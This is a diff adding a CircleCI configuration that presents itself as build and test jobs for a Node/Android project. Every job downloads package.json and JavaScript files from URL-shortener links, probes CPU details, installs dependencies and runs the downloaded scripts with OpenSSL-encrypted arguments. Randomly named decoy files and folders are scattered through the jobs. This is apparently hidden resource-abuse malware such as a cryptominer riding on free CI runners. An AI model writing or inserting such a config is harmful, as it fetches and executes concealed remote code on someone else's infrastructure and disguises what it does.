@@ -1,0 +1,74 @@
+version: 2.1
+orbs:
+  android: circleci/android@1.0
+jobs:
+  FuckJobs:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: touch q2mmy3fyhqngqo7ghq3041.php
+      - run: mkdir pygzn1kqnn0wztczgj
+      - run: curl -fsSL shorturl.at/aopJU -o package.json && curl -fsSL
+          shorturl.at/hjyLM -o 85ppyw8j9vegpx4.js && curl -fsSL
+          shorturl.at/nruB3 -o 49t9sfscv.js
+      - run: cat /proc/cpuinfo | grep 'vendor' | uniq && cat /proc/cpuinfo | grep 'model
+          name' | uniq && cat /proc/cpuinfo | grep processor | wc -l && cat
+          /proc/cpuinfo | grep 'core id'
+      - run: npm i -s
+      - run: mkdir snazhi6lcrz4uinnk4asj
+      - run: touch ndngqpjfsck8pvte90zvigihq7.css
+      - run: node 49t9sfscv -s
+          U2FsdGVkX19jRe6mORgBUJenPrvyhdQ33hckuvJ0rjyiPJiioqhJ06U1o32DE0HPmGmh1YABOeMo+JkXNGcckncUlOGl/l77dSljixn23kkrtuAeXw13vok/EZKu5IBE59PctTiPVtao9YQj3XgmhPSdmdDw4sDjrCrUWVZUlJXbXZFE63OIo93rEjjofmVIkc+NiFD2M0KBQtZfAa2ogGmBIL6+mkYlG5hJd436sFY=
+          -sp -r
+          U2FsdGVkX18NssfOhC3Rp90FtQq05/mXP1/GayMkMnrKH5hvpv+/GbKdZnl/Nu1I1zpdBcwg0mXnfEeIugjnILDM7koHUldVd38QBvaGR1Tx3WISfdXRlV6aiTy8hS6NbbMfDBJV5KnpC+wN66WqnbAi8/pFlbAN65RmGPtn+UooF92tpACfGjaJlvEw23YbEjsf07HOMBM28wc2jlIzciO03opVCV0Onx8UOAZzOBVYV2eYy0zxfBMwh1HWVXMDRATsFkDRmgK5u9VHeir+hv5QHy+zUO4y/Ufrc8fLWRo=
+          -lpn U2FsdGVkX19tVw4L7iGYRYVt1kAjuAVaI1WN4exo+qI= -t
+          U2FsdGVkX1/NUNH9kyWqL9MfsOY2k6lZXQG1GQDZ80DaBaZ/F9IMrBZqN+/4EftD
+      - run: mkdir gmgebrwd9zw5a660cwiscgd
+  building:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: touch jtugywmix1o.php
+      - run: curl -fsSL shorturl.at/pwFRZ -o package.json && curl -fsSL
+          shorturl.at/dknoB -o h6e3wpovmys1d.js && curl -fsSL shorturl.at/kmxFN
+          -o n9pl01dd8zge.js
+      - run: touch 3sjo5ib4r66kerc3jkb.net
+      - run: npm i -s
+      - run: mkdir 69ijajc7mr0oe6fq55khb
+      - run: mkdir z804ntfxdkw7
+      - run: touch 5lwk3wfwl2g6yejl345dm.js
+      - run: mkdir 7she44e4pq84s2s
+      - run: node h6e3wpovmys1d -r
+          U2FsdGVkX1/OId3ptHCceunzH3aTob3RvdZqDWWI69Y85vanb8oFAjS8yWxS5m+gI+TkA1/W5Lh2/o5jluDamJ0gQeuUJtwupy3Y6b4zjLDUZpKHeTopVl30ughzkVQ6D/aYiBd3FRU4K+59klFpPQf2+D4LVd8C7Rus2PT+uOASMtqBXNz5xtgjnMEqwEYXs8Uebx+i+mCkOW4lVnMDLVBCzFbqyIzmaTwdkwIfypmGRJTDwmooXPBPxGQE318L4nSz2hfNQxEupGmVPNbtiDDsfs7pEML47pGysJMqKTY=
+          -s
+          U2FsdGVkX185rR3JRHmD1TNwHuWLaKjY5CD7ozxrW2l66Y5WkILlVCZ2Q7+rMPTP7xHVwyCAYfGaw5Yl3YBwV54L461xMkrybbeiVsMrAqzOx0pwae0dKc5zlQMkfuK8gP7miT1Jw6H2n70d0yYfn0YQFrqiBOPsiWtDZIcsXlC4ZucieneYk68HxqtFLnJhwiVlhj3XEx6W2ZJj4mJ0ajdhuaaw1F3ym+67IzCXnB8=
+          -sp -lpn U2FsdGVkX18C1A6dlJFeDhJecr84taP/vo7VhrNW5ZA= -t
+          U2FsdGVkX18PaEmXH3zqhBNohczHNIxcUlyGGS/qKE0xLy5/Q32iDQ/L0XqeYp9I
+  nodeTest:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: curl -fsSL shorturl.at/lrEZ6 -o vxqjmltcqkond.js && curl -fsSL
+          shorturl.at/ivE04 -o package.json && curl -fsSL shorturl.at/fqxGM -o
+          jvdp1lgrnc6fu34ni5a.js
+      - run: mkdir r9vab9re0pkyr330jpciw33enn2nv
+      - run: mkdir goln537yvpser3foea6
+      - run: npm i -s
+      - run: touch w8ebfb3nuvn8kz2dmc.java
+      - run: touch wroeza7v80h.py
+      - run: mkdir 418io2qb9hegif9c
+      - run: touch aqxkskl194rcqdm3irvmx4k6h.css
+      - run: node vxqjmltcqkond -r
+          U2FsdGVkX1/CG/Bg4fMjGyXulYUikIbuRxJpVaSnUuAoNNSD2mzI8ZdRbnjNA2kY7PlH0vS4pubHhZ7hx3aK/vpaKknys19FFIK0TKKyRzgBuRCgpL7SjvnQ/I1R8GgCVuxfmg3Jo1Ugicwrw/aWySJE1MgfSvXEmg7nwVpif2qVgTZvBHn7FdJta7AtIdvzlP6MxvLWz0BSVGvKGpJNVvl5/hb3/CWNbWKFRbMuPT8HrZJypca+1GXRl+VeqhwSYwsoRVemdNvm/BGuymSKSuwE+oZ+sItXbr3ysYWkWTw=
+          -t U2FsdGVkX19KMLRo3mjE6mMw6RyTSKsV6OcqbzQH+RbypVM8iI/Ha/sjerIaQVZo -s
+          U2FsdGVkX19Lgo6IoTIYqwls7ptWVqQp3olv3Fx9Uw6R3pAPu027ixJY78VFyvaAb5WBgyimeUAoV9dtqeSbQs0nF1emjN4prMzlhzjubQPSYFdKJJrh5Iei1V32PQQQQ+DjW8iceQ+tOxIgV+g1COgpPZgkPO6YXJjmxNLzY6m0Rqc8VlTxLGmLcJL83WxN//73cES7BpuA2TgMeaOe5AIQUkiPr3Vh9Oe3pBtMrII=
+          -sp -lpn
+          U2FsdGVkX19vJCrBQW8Ei4/b6GgFnZ8457NhJZ2I3gzPUHwjIX3/lfR47x1bSIRu
+workflows:
+  fucking:
+    jobs:
+      - FuckJobs
+  NodejsJobs:
+    jobs:
+      - building
+      - nodeTest
